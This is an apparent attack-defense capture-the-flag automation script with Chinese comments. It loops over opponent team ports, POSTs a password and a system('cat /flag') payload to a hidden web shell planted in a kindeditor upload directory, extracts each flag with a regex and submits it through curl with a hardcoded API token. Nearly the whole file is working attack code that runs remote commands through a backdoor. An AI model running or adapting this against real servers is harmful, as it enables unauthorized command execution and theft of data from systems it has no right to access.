# coding=utf-8
import time
import re
import subprocess
import requests

############################################################
###################### READ ME FIREST ######################
############################################################
# 需要修改的内容：
# 1、main函数中的ip、port、token配置
# 2、attack函数中payload内容
# 3、submit函数中curl链接及格式
# 需要注意的事项：
# 1、attack中的remote或request必须设置timeout
# 2、接受flag前一定要把其他回显接收完
# 3、正式运行时将debug关闭，减少回显

# 格式化输出攻击结果


def print_attack_result(ip, port, flag): return print(
    "[\033[0;36mFLAGS\033[0m] " + ip + ":" + port + "\033[0m flag is : \033[0;36m" + flag + "\033[0m")


def print_exc_result(ip, port, p, e): return print("[\033[0;37;41mERROR\033[0m] \033[0;32m" + ip +
                                                   "\033[0m:\033[0;34m" + port + "\033[0m" + p + "\033[0;31m" + str(e) + "\033[0m")

#########################################################################


def attack(ip, port):
    try:
        ################## 构造payload ################
        flag_data = {'pass': 'q398612964', 'a': "system('cat /flag');"}
        ret = requests.post("http://" + ip + ":" + port + "/sqlgunadmin/kindedit/attached/20220715/.index.php",
                            data=flag_data, timeout=10)
        # # 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', ret.text).group()
        # #打印攻击结果
        print_attack_result(ip, port, flag)
        return flag

    except Exception as e:
        print_exc_result(ip, port, 'can not attack,because:', str(e))
        return False


def submit(ip, port, flag):
    try:
        # 构造submit的格式
        a = subprocess.Popen(
            ['curl -X POST http://192.168.15.80:19999/api/flag -H "Authorization: 1b1fae078083811a61e7794e8320755b" -d "{ \"flag\": flag }"'.format(
                flag=flag)],
            shell=True, stdout=subprocess.PIPE)
        print(a.stdout.readline())
        print("[\033[0;32mSUCCE\033[0m] " +
              ip + ":" + port + " submit success")
    except Exception as e:
        print_exc_result(ip, port, 'submit failed,because:', str(e))
        return False


def main():
    try:
        # 一轮中所有队伍
        for i in range(8801, 8806):
            self_id = 8802  # 跳过自己的队伍ip/端口
            if i == self_id:
                continue
            # 修改ip地址格式
            server_ip = "192.168.15.80"
            # 开始攻击
            flag = attack(server_ip, str(i))
            # 提交flag
            submit('192.168.15.80', 19999, flag)
            time.sleep(1)
        print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
                                                             time.localtime()) + " round attack end, waitting for next round")
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mmain function error, because: " + str(e) + "\033[0m")
        exit(0)


if __name__ == '__main__':
    try:
        while 1:
            # 每个轮次
            print("[\033[0;30;43mROUND\033[0m] " + time.strftime("%Y-%m-%d %H:%M:%S",
                                                                 time.localtime()) + " begin to attack")
            main()
            time.sleep(5 * 60)
    except Exception as e:
        print("[\033[0;37;41mERROR\033[0m] \033[0;37;41mmain function error, because: " + str(e) + "\033[0m")
        exit(0)
